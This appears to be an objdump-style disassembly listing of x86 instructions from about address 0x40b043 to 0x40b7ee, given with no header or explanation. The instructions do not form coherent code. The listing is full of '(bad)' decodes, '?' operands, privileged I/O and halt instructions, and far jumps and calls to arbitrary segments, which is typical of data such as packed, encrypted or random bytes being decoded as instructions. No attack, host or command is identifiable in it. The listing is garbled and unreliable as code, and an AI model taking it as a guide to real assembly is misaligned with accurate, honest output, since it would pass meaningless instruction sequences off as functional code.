  40b043:	xchg   edx,eax
  40b044:	mov    DWORD PTR [edx+0x41049e1e],ecx
  40b04a:	pop    ebp
  40b04b:	call   FWORD PTR [edi-0x1315e20f]
  40b051:	popf   
  40b052:	inc    ebp
  40b053:	xchg   edi,eax
  40b054:	sbb    DWORD PTR [eax-0x69dd635],esi
  40b05a:	mov    ah,0x47
  40b05c:	js     0x40b08e
  40b05e:	aas    
  40b05f:	sub    eax,0xee2ae2cf
  40b064:	inc    ebp
  40b065:	sbb    ebx,esp
  40b067:	mov    ds:0xa6eb5bb9,eax
  40b06c:	adc    al,0x64
  40b06e:	cmp    eax,0x2b960515
  40b073:	xlat   BYTE PTR ds:[ebx]
  40b074:	test   al,0xca
  40b076:	push   cs
  40b077:	ins    DWORD PTR es:[edi],dx
  40b078:	dec    ebp
  40b079:	jl     0x40b0cd
  40b07b:	cmp    al,0xe0
  40b07d:	fmul   QWORD PTR [edi-0x61]
  40b080:	xlat   BYTE PTR ds:[ebx]
  40b081:	inc    esi
  40b082:	lock (bad) 
  40b084:	xchg   ecx,eax
  40b085:	fnsave [eax]
  40b087:	or     DWORD PTR [esi],edx
  40b089:	jmp    0xdaa1:0x4f222cac
  40b090:	sbb    BYTE PTR [esi+esi*8-0x553738d1],ah
  40b097:	adc    ecx,DWORD PTR [ebp+0x5814d36d]
  40b09d:	xor    ah,BYTE PTR [esi+0x6d272df5]
  40b0a3:	xchg   edx,eax
  40b0a4:	inc    eax
  40b0a5:	retf   
  40b0a6:	pop    ds
  40b0a7:	pop    es
  40b0a8:	(bad)  
  40b0a9:	shl    BYTE PTR [ecx+0x1fb909bf],1
  40b0af:	loope  0x40b12a
  40b0b1:	out    0x9a,eax
  40b0b3:	pop    es
  40b0b4:	xlat   BYTE PTR ds:[ebx]
  40b0b5:	imul   esi,DWORD PTR [ebp-0x36910bcc],0xa63c98b2
  40b0bf:	int3   
  40b0c0:	mov    dh,0x89
  40b0c2:	and    BYTE PTR [ebp-0x6e],ah
  40b0c5:	jmp    0x9ab18034
  40b0ca:	or     al,0x8b
  40b0cc:	dec    eax
  40b0cd:	loope  0x40b093
  40b0cf:	neg    BYTE PTR [eax+0x3d6b1939]
  40b0d5:	pop    ss
  40b0d6:	lahf   
  40b0d7:	xchg   esp,eax
  40b0d8:	fwait
  40b0d9:	xor    al,0x16
  40b0db:	aad    0xfe
  40b0dd:	add    dh,BYTE PTR [esi]
  40b0df:	iret   
  40b0e0:	xchg   esi,eax
  40b0e1:	adc    DWORD PTR [eax+0x7f6d6083],edx
  40b0e7:	add    eax,0xb2963197
  40b0ec:	jo     0x40b123
  40b0ee:	xor    ch,BYTE PTR [ebx-0x6573c45a]
  40b0f4:	inc    ebp
  40b0f5:	fcomp  QWORD PTR [ecx+0x7af010a2]
  40b0fb:	adc    BYTE PTR [ebp+0x7a],al
  40b0fe:	xchg   BYTE PTR ds:0x248eea09,dl
  40b104:	out    0xa4,eax
  40b106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b107:	sbb    eax,0x9bf535c8
  40b10c:	aas    
  40b10d:	pop    esi
  40b10e:	fldcw  WORD PTR [eax+0x37]
  40b111:	sbb    ch,ah
  40b113:	xor    ebx,DWORD PTR [edi]
  40b115:	sti    
  40b116:	inc    ecx
  40b117:	inc    esp
  40b118:	es test al,0x8e
  40b11b:	(bad)  
  40b11c:	(bad)  
  40b11e:	std    
  40b11f:	jnp    0x40b0b9
  40b121:	sahf   
  40b122:	daa    
  40b123:	inc    ecx
  40b124:	and    eax,0x510f5d87
  40b129:	mov    bh,0x97
  40b12c:	mov    ds:0x94f24725,al
  40b131:	adc    al,0x15
  40b133:	mov    ebp,DWORD PTR [ecx]
  40b135:	mov    ebp,0x490e906
  40b13a:	cmp    BYTE PTR [ecx+0xb66b35c],ah
  40b140:	ret    
  40b141:	imul   edi,ecx,0x19
  40b144:	jns    0x40b12a
  40b146:	xor    eax,0xdd08e6f1
  40b14b:	or     esi,ecx
  40b14d:	dec    edx
  40b14e:	xor    DWORD PTR [eax+0xf],edx
  40b151:	std    
  40b152:	mov    dh,0x97
  40b154:	jmp    0x994e:0x6a90b78b
  40b15b:	stos   DWORD PTR es:[edi],eax
  40b15c:	fdivr  st(4),st
  40b15e:	cmc    
  40b15f:	ret    
  40b160:	or     BYTE PTR [eax+0x1c],0xb0
  40b164:	repnz mov ebx,0xadb502de
  40b16a:	jns    0x40b1c2
  40b16c:	jle    0x40b11a
  40b16e:	fnstcw WORD PTR [esi-0x22]
  40b171:	js     0x40b12b
  40b173:	jne    0x40b155
  40b175:	and    ebp,DWORD PTR [edi+0x68]
  40b178:	xor    al,0xaf
  40b17a:	jl     0x40b196
  40b17c:	push   0xbdb9a43b
  40b181:	call   0xefd67d96
  40b186:	es fsubp st(2),st
  40b189:	pop    edi
  40b18a:	loope  0x40b14e
  40b18c:	call   0xf702:0x633009b1
  40b193:	pop    ds
  40b194:	pop    esp
  40b195:	out    dx,eax
  40b196:	popa   
  40b197:	dec    eax
  40b198:	mov    al,BYTE PTR [edx+0x2e]
  40b19b:	enter  0x2cd3,0x84
  40b19f:	ds loope 0x40b1b9
  40b1a2:	push   ds
  40b1a3:	xor    al,0xdd
  40b1a5:	repnz daa 
  40b1a7:	and    eax,DWORD PTR [ebx+0x58]
  40b1aa:	sub    eax,0x9c237dde
  40b1af:	ins    BYTE PTR es:[edi],dx
  40b1b0:	dec    eax
  40b1b1:	cdq    
  40b1b2:	push   edi
  40b1b3:	les    esi,FWORD PTR ds:[edi+0x37]
  40b1b7:	out    0xe5,al
  40b1b9:	aad    0xb5
  40b1bb:	mov    esi,0x9dfcde3f
  40b1c0:	repnz push ebx
  40b1c2:	push   ebx
  40b1c3:	sub    ebp,esp
  40b1c5:	fld    TBYTE PTR [edi]
  40b1c7:	shl    DWORD PTR ds:0x2dbd797b,1
  40b1cd:	je     0x40b1a7
  40b1cf:	dec    ebx
  40b1d0:	inc    ecx
  40b1d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d2:	inc    eax
  40b1d3:	hlt    
  40b1d4:	into   
  40b1d5:	pop    es
  40b1d6:	stos   BYTE PTR es:[edi],al
  40b1d7:	mov    ebp,DWORD PTR [edi]
  40b1d9:	mov    esi,0x9fb35619
  40b1de:	mov    ah,0x4a
  40b1e0:	cmp    al,0xa2
  40b1e2:	mov    ch,0x67
  40b1e4:	inc    ecx
  40b1e5:	pop    edx
  40b1e6:	addr16 or al,0xae
  40b1e9:	ss jl  0x40b1e8
  40b1ec:	iret   
  40b1ed:	mov    BYTE PTR [ebx],dh
  40b1ef:	sub    BYTE PTR [ecx],bl
  40b1f1:	ins    DWORD PTR es:[edi],dx
  40b1f2:	mov    ebx,esp
  40b1f4:	xchg   ebp,eax
  40b1f5:	push   esi
  40b1f6:	jmp    0xade2:0xafc61a28
  40b1fd:	inc    ecx
  40b1fe:	sub    DWORD PTR ds:0xa4055f4e,edx
  40b204:	mov    eax,ds:0x6ddc1e6a
  40b209:	into   
  40b20a:	sub    eax,0x3f97fef7
  40b20f:	idiv   BYTE PTR [ecx-0x4ab61f8d]
  40b215:	lahf   
  40b216:	call   0x582582b0
  40b21b:	mov    bl,0xf1
  40b21d:	dec    eax
  40b21e:	mov    BYTE PTR [edx+0x25],ch
  40b221:	xor    eax,0x54ead818
  40b226:	dec    edx
  40b227:	js     0x40b208
  40b229:	out    0x80,eax
  40b22b:	mov    bl,0xf4
  40b22d:	call   0x8c7f:0x562cc74f
  40b234:	add    eax,0x3efa6cc9
  40b239:	mov    ds:0x571ad22a,eax
  40b23e:	iret   
  40b23f:	or     al,0xee
  40b241:	(bad)  [ebx+0x150e95b2]
  40b247:	daa    
  40b248:	push   edi
  40b249:	xchg   DWORD PTR [esi],ecx
  40b24b:	push   0xffffffb3
  40b24d:	inc    edi
  40b24e:	add    DWORD PTR ss:[ebx],edi
  40b251:	dec    esi
  40b252:	mov    edi,0xb354d116
  40b257:	push   ss
  40b258:	fdiv   st(7),st
  40b25a:	add    dh,ah
  40b25c:	imul   edx,DWORD PTR [edi],0xfffffffb
  40b25f:	outs   dx,BYTE PTR ds:[esi]
  40b260:	and    dh,ch
  40b262:	or     ebx,0xfffffff8
  40b265:	sbb    BYTE PTR [ebp+0xf5f150a],dh
  40b26b:	dec    ebx
  40b26c:	xor    al,0x5f
  40b26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b26f:	outs   dx,BYTE PTR ds:[esi]
  40b270:	and    edx,DWORD PTR [edx-0x3310dcce]
  40b276:	mov    ecx,0x61236e37
  40b27b:	pop    ss
  40b27c:	popf   
  40b27d:	mov    al,0x10
  40b27f:	loopne 0x40b2ae
  40b281:	cli    
  40b282:	push   ebx
  40b283:	jne    0x40b24e
  40b285:	sbb    BYTE PTR [edi+0x19],al
  40b288:	jg     0x40b2cf
  40b28a:	add    ebp,DWORD PTR [edi-0x72b677b7]
  40b290:	mov    fs:0x8f1cef26,al
  40b296:	jle    0x40b306
  40b298:	dec    eax
  40b299:	adc    DWORD PTR [ebx+0x5df42b95],eax
  40b29f:	lds    eax,FWORD PTR [edx+0x39]
  40b2a2:	add    DWORD PTR [edi-0x79],0x13983cc0
  40b2a9:	mov    ecx,0x8ca54a27
  40b2ae:	fdivr  DWORD PTR [edx-0x47]
  40b2b1:	nop
  40b2b2:	repnz mov ds:0x9fac0288,eax
  40b2b8:	nop
  40b2b9:	fld    TBYTE PTR [ebx]
  40b2bb:	ret    
  40b2bc:	inc    edx
  40b2bd:	jnp    0x40b306
  40b2bf:	push   edi
  40b2c0:	jl     0x40b336
  40b2c2:	add    eax,0x327a1266
  40b2c7:	stos   BYTE PTR es:[edi],al
  40b2c8:	mov    eax,DWORD PTR [eax]
  40b2ca:	adc    bl,BYTE PTR [ebx+0x40]
  40b2cd:	mov    ds:0x1923034a,al
  40b2d2:	mov    edx,0x3320c54d
  40b2d7:	outs   dx,BYTE PTR ds:[esi]
  40b2d8:	mov    ds:0x965d602,al
  40b2dd:	fldenv [ebp+0x2010beea]
  40b2e3:	xor    BYTE PTR ds:0x6d536c38,dh
  40b2e9:	mov    dh,bh
  40b2eb:	pop    edx
  40b2ec:	add    esp,DWORD PTR [ecx+0x15]
  40b2ef:	mov    bh,0x8b
  40b2f1:	stos   BYTE PTR es:[edi],al
  40b2f2:	push   edx
  40b2f3:	adc    DWORD PTR [ebp+0x514df08c],edi
  40b2f9:	stos   BYTE PTR es:[edi],al
  40b2fa:	(bad)  
  40b2fd:	dec    esi
  40b2fe:	aam    0x9f
  40b300:	mov    al,ds:0x5770fdfe
  40b305:	js     0x40b2ab
  40b307:	sub    ecx,DWORD PTR [esi+0x48]
  40b30a:	xchg   esi,eax
  40b30b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b30d:	xchg   DWORD PTR gs:[eax+0x1a7248ea],edi
  40b314:	(bad)  
  40b315:	xlat   BYTE PTR ds:[ebx]
  40b316:	push   0xb0b26ff7
  40b31b:	mov    ebx,0x8ab30420
  40b320:	test   BYTE PTR [ebx+esi*4+0x466b7d73],cl
  40b327:	dec    ecx
  40b328:	pop    ss
  40b329:	lods   al,BYTE PTR ds:[esi]
  40b32a:	out    0x59,al
  40b32c:	imul   eax,DWORD PTR [eax],0x53
  40b32f:	mov    edx,0x7aced819
  40b334:	iret   
  40b335:	add    bh,BYTE PTR [edx+0xe]
  40b338:	cmc    
  40b339:	popa   
  40b33a:	aas    
  40b33b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b33c:	or     ebx,esp
  40b33e:	xchg   esp,eax
  40b33f:	(bad)  
  40b340:	shl    ebp,1
  40b342:	sub    ch,ch
  40b344:	inc    edx
  40b346:	and    al,0xe9
  40b348:	mov    BYTE PTR [esi],dh
  40b34a:	push   ebp
  40b34b:	in     eax,dx
  40b34c:	test   eax,0x4a6e654b
  40b351:	outs   dx,BYTE PTR ds:[esi]
  40b352:	and    esp,DWORD PTR [ecx+0x29]
  40b355:	and    al,0x20
  40b357:	xlat   BYTE PTR ds:[ebx]
  40b358:	mov    ds:0xf1333eb6,eax
  40b35d:	in     eax,0xd2
  40b35f:	fstp   TBYTE PTR [eax-0x26a69c24]
  40b365:	xlat   BYTE PTR ds:[ebx]
  40b366:	dec    edi
  40b367:	repz and eax,DWORD PTR ds:[eax+eiz*1]
  40b36c:	lea    edi,[esi+edi*2+0x4b]
  40b370:	cmc    
  40b371:	cmp    ch,ch
  40b373:	cli    
  40b374:	data16 mov BYTE PTR [edx-0x67c6408f],cl
  40b37b:	ficomp DWORD PTR [ebx]
  40b37d:	stc    
  40b37e:	jnp    0x40b3a0
  40b380:	fisubr DWORD PTR [edx+0x54]
  40b383:	fcmovne st,st(6)
  40b385:	inc    ecx
  40b386:	pop    ss
  40b387:	sub    al,0x77
  40b389:	hlt    
  40b38a:	mov    ss,edx
  40b38c:	jae    0x40b33a
  40b38e:	cmp    esp,DWORD PTR [ebx+0x8]
  40b391:	(bad)  
  40b392:	dec    ebp
  40b393:	adc    dh,bh
  40b395:	jle    0x40b37c
  40b397:	jns    0x40b31f
  40b399:	cmp    eax,0xb9b2f236
  40b39e:	xchg   DWORD PTR [ecx],ebp
  40b3a0:	adc    dh,BYTE PTR [ecx-0x69]
  40b3a3:	sub    ah,ah
  40b3a5:	xchg   ebx,eax
  40b3a6:	cmp    BYTE PTR ds:0x98285c67,dh
  40b3ac:	call   0x1eb1:0xca26fb13
  40b3b3:	adc    BYTE PTR [ebp+0x6f],cl
  40b3b6:	sahf   
  40b3b7:	repnz aaa 
  40b3b9:	and    eax,0x3692dfa3
  40b3be:	xchg   ebx,eax
  40b3bf:	mov    ebp,ecx
  40b3c1:	mov    ds:0x424c7e61,eax
  40b3c6:	dec    esi
  40b3c7:	ss mov ebp,0x94533a98
  40b3cd:	not    DWORD PTR [esi-0x41bd0ea7]
  40b3d3:	inc    ecx
  40b3d4:	and    BYTE PTR [esi-0x59],0x37
  40b3d8:	adc    bh,al
  40b3da:	jmp    DWORD PTR [edx-0x2c]
  40b3dd:	lahf   
  40b3de:	sub    BYTE PTR [ecx-0x22],dl
  40b3e1:	or     esp,DWORD PTR [eax]
  40b3e3:	aad    0x8d
  40b3e5:	dec    ebp
  40b3e6:	xlat   BYTE PTR ds:[ebx]
  40b3e7:	push   es
  40b3e8:	add    ebx,DWORD PTR [eax-0x2c2d2199]
  40b3ee:	adc    dh,BYTE PTR [ebp+0x38]
  40b3f1:	sbb    eax,0xea04d5c7
  40b3f6:	mov    ah,0x16
  40b3f8:	test   DWORD PTR [ebx+eiz*4-0x3d978b75],ebx
  40b3ff:	mov    eax,0x3bdb45c3
  40b404:	shr    DWORD PTR [ebp+0x28],0x7
  40b408:	add    DWORD PTR [edi+0x29],eax
  40b40b:	pop    edi
  40b40c:	jmp    0x6e11:0x7e732770
  40b413:	jl     0x40b448
  40b415:	dec    esp
  40b416:	aaa    
  40b417:	add    DWORD PTR [eax+0x45],0x17
  40b41b:	jmp    0x1641436c
  40b420:	pop    ebp
  40b421:	shl    DWORD PTR [edi+0x4e9c0795],1
  40b427:	dec    ebx
  40b428:	imul   ecx,DWORD PTR [edx+0x6c99c6f],0xf16e1b5a
  40b432:	cmp    dh,BYTE PTR [ebx]
  40b434:	stc    
  40b435:	add    al,0xec
  40b437:	jle    0x40b473
  40b439:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b43b:	dec    esi
  40b43c:	ja     0x40b4b8
  40b43e:	int    0x62
  40b440:	push   ss
  40b441:	stc    
  40b442:	and    edi,DWORD PTR [ecx]
  40b444:	imul   edx,DWORD PTR [edi+0x56],0x7cdd46ef
  40b44b:	sub    DWORD PTR [esi+0x21],ecx
  40b44e:	fisttp QWORD PTR [esi-0x4eebd1ce]
  40b454:	stos   DWORD PTR es:[edi],eax
  40b455:	xchg   ebx,eax
  40b456:	or     edx,DWORD PTR [ecx-0x7b]
  40b459:	into   
  40b45a:	fiadd  DWORD PTR [edi]
  40b45c:	or     eax,0xbb6ef1fb
  40b461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b462:	push   ss
  40b463:	pop    eax
  40b464:	mov    DWORD PTR [ecx+0x396778f7],0xede90f9
  40b46e:	xchg   ebp,eax
  40b46f:	cmp    DWORD PTR [ecx-0x7a],edi
  40b472:	sub    BYTE PTR [ebx+0x5a],0xf8
  40b476:	jl     0x40b3f9
  40b478:	sbb    eax,0x9071b444
  40b47d:	xor    eax,0x9af1d3b4
  40b482:	scas   al,BYTE PTR es:[edi]
  40b483:	mov    cl,cl
  40b485:	shl    DWORD PTR [esi+0x69562902],cl
  40b48b:	jae    0x40b478
  40b48d:	(bad)  
  40b48e:	aad    0x57
  40b490:	cmp    BYTE PTR [ebx],cl
  40b492:	lock in eax,dx
  40b494:	sub    al,0xec
  40b496:	xor    al,BYTE PTR [ecx]
  40b498:	leave  
  40b499:	(bad)  [ebx]
  40b49b:	mov    WORD PTR [ecx-0x108e0830],es
  40b4a1:	daa    
  40b4a2:	push   cs
  40b4a3:	jecxz  0x40b4e5
  40b4a5:	(bad)  [ecx+0x32]
  40b4a8:	test   DWORD PTR [eax],esp
  40b4aa:	jns    0x40b4a6
  40b4ac:	adc    eax,0x73fcbe02
  40b4b1:	mov    esp,0x9b8ab621
  40b4b6:	push   eax
  40b4b7:	jp     0x40b449
  40b4b9:	jnp    0x40b493
  40b4bb:	vpsrlq xmm4,xmm4,xmm7
  40b4bf:	jmp    0x36e9:0x68251c6b
  40b4c6:	xchg   DWORD PTR [edx+0x785907a1],ecx
  40b4cc:	pop    ecx
  40b4cd:	arpl   ax,bx
  40b4cf:	call   0x67a1:0xc6bf390b
  40b4d6:	repnz (bad) [edx+0x6a682897]
  40b4dd:	loope  0x40b4be
  40b4df:	push   0x9023b76a
  40b4e4:	test   eax,0xfc49d9f1
  40b4e9:	inc    eax
  40b4ea:	aas    
  40b4eb:	pop    ecx
  40b4ec:	xchg   ecx,eax
  40b4ed:	test   al,0xcd
  40b4ef:	xor    al,0x92
  40b4f1:	jmp    0xe239eb94
  40b4f6:	mov    esp,0x732f529b
  40b4fb:	jge    0x40b4da
  40b4fd:	mov    BYTE PTR [ecx+0x16],ah
  40b500:	xor    BYTE PTR [eax+ebx*2-0x79],0x5d
  40b505:	fwait
  40b506:	ret    0x4edf
  40b509:	icebp  
  40b50a:	cmp    DWORD PTR [ecx],esp
  40b50c:	jp     0x40b570
  40b50e:	add    ebp,eax
  40b510:	and    DWORD PTR [esi-0x5b693e82],0x1a60eae2
  40b51a:	bound  esi,QWORD PTR [ecx+0x14]
  40b51d:	mov    cl,0x63
  40b51f:	sbb    DWORD PTR [ecx+0x79001427],eax
  40b525:	arpl   WORD PTR [esi],dx
  40b527:	repnz idiv bl
  40b52a:	pop    ds
  40b52b:	push   ecx
  40b52c:	or     dh,BYTE PTR [esi-0x3c]
  40b52f:	xchg   edi,eax
  40b530:	lds    ebp,FWORD PTR [ebx]
  40b532:	push   ecx
  40b533:	sti    
  40b534:	xor    BYTE PTR [ebp+0x61],cl
  40b537:	fsub   DWORD PTR [ecx]
  40b539:	jge    0x40b5b5
  40b53b:	aam    0xab
  40b53d:	xor    al,0x38
  40b53f:	mov    bh,0x56
  40b541:	cmc    
  40b542:	adc    dl,BYTE PTR [edx+ecx*4]
  40b545:	push   edi
  40b546:	push   esp
  40b547:	arpl   WORD PTR [ecx-0x63],cx
  40b54a:	std    
  40b54b:	add    eax,0xfef9db1a
  40b550:	imul   edx,DWORD PTR [esi-0x58e925d2],0x2bc2e74
  40b55a:	add    al,0x7c
  40b55c:	iret   
  40b55d:	adc    eax,DWORD PTR [ecx-0x66c5c19b]
  40b563:	shr    ch,1
  40b565:	xchg   ebp,eax
  40b566:	xor    al,0x48
  40b568:	dec    DWORD PTR [eax]
  40b56a:	or     eax,0x9332b8cb
  40b56f:	test   BYTE PTR cs:[edx-0x23],0x6f
  40b574:	shl    BYTE PTR [edx-0x57],0xa4
  40b578:	fbstp  TBYTE PTR [eax-0x2e89c03]
  40b57e:	inc    ebx
  40b57f:	mov    ds:0xc71d0c41,al
  40b584:	dec    esi
  40b585:	cs or  eax,0xa3f5616
  40b58b:	adc    DWORD PTR [ecx+eax*4],edi
  40b58e:	push   esi
  40b58f:	pusha  
  40b590:	jns    0x40b5d4
  40b592:	jnp    0x40b558
  40b594:	sub    cl,ch
  40b596:	mov    fs,WORD PTR [ebx-0x395fb1b]
  40b59c:	jno    0x40b60f
  40b59e:	sub    cl,BYTE PTR [ebx+0x38]
  40b5a1:	add    DWORD PTR ds:0x5ed0e1e8,esp
  40b5a7:	leave  
  40b5a8:	repz les esp,FWORD PTR [eax+0x61]
  40b5ac:	fistp  WORD PTR [ecx+ecx*4]
  40b5af:	enter  0x16e8,0x6b
  40b5b3:	outs   dx,BYTE PTR ds:[esi]
  40b5b4:	and    dh,BYTE PTR gs:[ecx-0x3e]
  40b5b8:	cmp    eax,0xf681014c
  40b5bd:	sub    eax,0x338e826a
  40b5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5c3:	mov    ecx,0x2f4ca69a
  40b5c8:	rcl    DWORD PTR [eax+0x275a30bb],1
  40b5ce:	push   0x23
  40b5d0:	call   FWORD PTR [ecx+0x33]
  40b5d3:	lds    esi,FWORD PTR [eax+ebx*8+0xe]
  40b5d7:	xchg   ebx,eax
  40b5d8:	hlt    
  40b5d9:	ins    DWORD PTR es:[edi],dx
  40b5da:	sbb    DWORD PTR [ebp+0x20],0xfb5dc037
  40b5e1:	add    BYTE PTR [ebx-0x6b],dl
  40b5e4:	jmp    0x40b5a6
  40b5e6:	pop    edi
  40b5e7:	fiadd  DWORD PTR [eax+0x2d9239e3]
  40b5ed:	fld    QWORD PTR [edi]
  40b5ef:	clc    
  40b5f0:	inc    esi
  40b5f1:	sub    DWORD PTR [ebx+0x3e9280e9],esi
  40b5f7:	push   esp
  40b5f8:	loopne 0x40b585
  40b5fa:	lock bound eax,QWORD PTR [edi-0x1e]
  40b5fe:	cld    
  40b5ff:	inc    ebx
  40b600:	pop    ds
  40b601:	call   0x6215:0x41fcd16c
  40b608:	mov    ds:0x24c92c1c,eax
  40b60d:	jne    0x40b59e
  40b60f:	and    DWORD PTR [ebx],ecx
  40b611:	aas    
  40b612:	mov    edi,0x2cabe07
  40b617:	or     DWORD PTR [ecx],esi
  40b619:	cmp    ecx,edx
  40b61b:	ss push ecx
  40b61d:	rcr    BYTE PTR [bx],0xb1
  40b621:	imul   ecx,DWORD PTR [esi+0x4ec98311],0xffffffdd
  40b628:	icebp  
  40b629:	jg     0x40b680
  40b62b:	inc    eax
  40b62c:	lahf   
  40b62d:	xchg   ebp,eax
  40b62e:	idiv   BYTE PTR [ebp-0x653be4e4]
  40b634:	pop    ebp
  40b635:	xchg   esi,eax
  40b636:	in     al,dx
  40b637:	bound  esp,QWORD PTR [eax+edx*8+0x38]
  40b63b:	xchg   ebp,eax
  40b63c:	es push esp
  40b63e:	push   esp
  40b63f:	mov    ds:0xd5daadea,al
  40b644:	div    BYTE PTR [ebx-0x5e]
  40b647:	pop    esp
  40b648:	frstor ds:[edi+0x3]
  40b64c:	daa    
  40b64d:	hlt    
  40b64e:	rol    BYTE PTR [ebx],1
  40b650:	mov    ds:0xed2aa23f,eax
  40b655:	sub    dh,ch
  40b657:	mov    ecx,0xf25357d5
  40b65c:	push   0x3
  40b65e:	fdiv   QWORD PTR [esi+0x19]
  40b661:	jne    0x40b6be
  40b663:	mov    ebx,0x276c2ac6
  40b668:	aad    0x7c
  40b66a:	cli    
  40b66b:	addr16 adc eax,0x70b85b29
  40b671:	push   ss
  40b672:	jns    0x40b646
  40b674:	mov    al,0xcd
  40b676:	adc    BYTE PTR [ebp-0x4dd63c6],ah
  40b67c:	jg     0x40b6df
  40b67e:	push   edi
  40b67f:	mov    ebp,0x40a2dc8b
  40b684:	bound  edx,QWORD PTR [ebp-0x53]
  40b687:	mov    al,0x32
  40b689:	pusha  
  40b68a:	jge    0x40b69d
  40b68c:	popf   
  40b68d:	sbb    BYTE PTR [edi-0x7],al
  40b690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b691:	mov    ecx,DWORD PTR [ebp-0x6e8ab446]
  40b697:	cmp    al,0xd2
  40b699:	add    eax,0xa9b5f2b0
  40b69e:	std    
  40b69f:	mov    edi,0xa47a1e29
  40b6a4:	jbe    0x40b715
  40b6a6:	adc    eax,DWORD PTR [ebp+0x3b84ed62]
  40b6ac:	iret   
  40b6ad:	enter  0xc59f,0x1
  40b6b1:	add    eax,0x7951b97f
  40b6b6:	call   0xc11f5abf
  40b6bb:	(bad)  
  40b6bd:	add    DWORD PTR [edx],ebx
  40b6bf:	ss ret 0xab0c
  40b6c3:	xchg   edi,eax
  40b6c4:	test   al,0x9b
  40b6c6:	pop    es
  40b6c7:	aad    0xd7
  40b6c9:	std    
  40b6ca:	dec    ch
  40b6cc:	inc    esi
  40b6cd:	push   ds
  40b6ce:	mov    BYTE PTR [ecx+0x199c912c],dh
  40b6d4:	fwait
  40b6d5:	sbb    eax,0x43726483
  40b6da:	sub    al,0x51
  40b6dd:	paddq  xmm5,XMMWORD PTR [esi-0x130c063c]
  40b6e5:	inc    esp
  40b6e6:	es adc eax,0x48086b59
  40b6ec:	mov    WORD PTR [ebp+0x9],?
  40b6ef:	mov    eax,ds:0xcb9dfa9b
  40b6f4:	iret   
  40b6f5:	stos   DWORD PTR es:[edi],eax
  40b6f6:	loope  0x40b74b
  40b6f8:	inc    bh
  40b6fa:	mov    ds:0x863188f,eax
  40b6ff:	loop   0x40b6f4
  40b701:	in     al,0x3a
  40b703:	mov    bl,0xf5
  40b705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b706:	fwait
  40b707:	cmp    bh,0x8f
  40b70a:	add    bl,ch
  40b70c:	mov    al,ds:0xf5df550
  40b711:	sub    al,0x8e
  40b713:	xchg   edx,eax
  40b714:	(bad)  
  40b715:	and    edx,esp
  40b717:	out    0xc7,al
  40b719:	icebp  
  40b71a:	js     0x40b72c
  40b71c:	shr    DWORD PTR [edx+edi*1],cl
  40b71f:	mov    ah,bl
  40b721:	ffree  st(5)
  40b723:	add    BYTE PTR [ebp-0x23b9fc09],0x28
  40b72a:	and    BYTE PTR [edx+0x4b],dh
  40b72d:	imul   edi,DWORD PTR [esi],0x53e236da
  40b733:	push   ss
  40b734:	out    dx,al
  40b735:	xchg   ecx,eax
  40b736:	cmc    
  40b737:	add    edi,DWORD PTR [esi]
  40b739:	inc    ebx
  40b73a:	mov    gs,WORD PTR [ebx+0xde3bf25]
  40b740:	adc    al,0xf1
  40b742:	mov    al,ds:0x7769712c
  40b747:	pop    es
  40b748:	mov    bl,0x79
  40b74a:	push   esi
  40b74b:	out    0xa4,al
  40b74d:	inc    ebp
  40b74e:	jge    0x40b761
  40b750:	pop    es
  40b751:	arpl   WORD PTR [edi],ax
  40b753:	inc    eax
  40b754:	mov    ?,WORD PTR [edx+0x1d]
  40b757:	pop    ebp
  40b758:	jge    0x40b765
  40b75a:	mov    ds:0x1c3990cd,eax
  40b75f:	mov    edx,0x8ffb77b
  40b764:	xchg   esi,eax
  40b765:	add    BYTE PTR [ecx+0x7f],dl
  40b768:	repz pop ebx
  40b76a:	(bad)  
  40b76b:	das    
  40b76c:	stos   DWORD PTR es:[edi],eax
  40b76d:	push   edi
  40b76e:	adc    al,0x61
  40b770:	mov    dl,0x65
  40b772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b773:	mov    esp,0xc92173f0
  40b778:	outs   dx,DWORD PTR ds:[esi]
  40b779:	lods   eax,DWORD PTR ds:[esi]
  40b77a:	loope  0x40b7ca
  40b77c:	mov    ?,ecx
  40b77e:	(bad)  
  40b77f:	and    esi,ebp
  40b781:	fs call 0x5abb7265
  40b787:	jg     0x40b76d
  40b789:	popa   
  40b78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b78b:	cmp    eax,edx
  40b78d:	inc    edi
  40b78e:	xchg   ecx,eax
  40b78f:	lock push 0x3d85454e
  40b795:	ins    DWORD PTR es:[edi],dx
  40b796:	inc    esp
  40b797:	test   eax,0xc9a00c4e
  40b79c:	xlat   BYTE PTR ds:[ebx]
  40b79d:	pop    ecx
  40b79e:	enter  0xfa0d,0x31
  40b7a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a3:	mov    ch,0xc8
  40b7a5:	add    BYTE PTR [edx-0x4127c49f],dl
  40b7ab:	sahf   
  40b7ac:	push   esp
  40b7ad:	scas   eax,DWORD PTR es:[edi]
  40b7ae:	sub    BYTE PTR [ecx+0x53032513],al
  40b7b4:	sub    bl,BYTE PTR [edx]
  40b7b6:	pop    ebx
  40b7b7:	shr    DWORD PTR [edx+ebp*4],1
  40b7ba:	out    0x9d,eax
  40b7bc:	add    edx,DWORD PTR [ebp-0x1efbf4c0]
  40b7c2:	jno    0x40b747
  40b7c4:	mov    ah,BYTE PTR [ebx+0x18]
  40b7c7:	cmp    cl,bh
  40b7c9:	push   esp
  40b7ca:	mov    eax,0xaec2fd74
  40b7cf:	jae    0x40b7b1
  40b7d1:	das    
  40b7d2:	jp     0x40b77a
  40b7d4:	ja     0x40b808
  40b7d6:	mov    dl,0x5b
  40b7d8:	pop    eax
  40b7d9:	shr    ecx,0xe9
  40b7dc:	add    DWORD PTR [ecx],esi
  40b7de:	dec    ecx
  40b7df:	xor    dh,bl
  40b7e1:	pusha  
  40b7e2:	cmp    DWORD PTR [eax],0xc10f2033
  40b7e8:	pop    ds
  40b7e9:	mov    ebx,0x260743bf
  40b7ee:	push   0xe4668038
